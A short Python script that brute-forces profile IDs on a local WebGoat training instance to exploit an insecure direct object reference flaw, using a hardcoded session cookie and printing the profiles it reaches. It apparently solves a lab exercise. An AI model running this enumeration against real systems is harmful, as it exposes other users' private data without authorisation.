#!/usr/bin/python3

import requests
import json

url = "http://localhost:8080/WebGoat/IDOR/profile/{}"
headers = {"Cookie":"JSESSIONID=9gV_fSFyQdWk55sOKlSqZHunQZ0myi165J77wlOT" }

start = 2342384

for i in range(1000):
	response = requests.get(
		url.format(start + i), 
		headers=headers)

	if response.status_code != 500:
		print(response.text)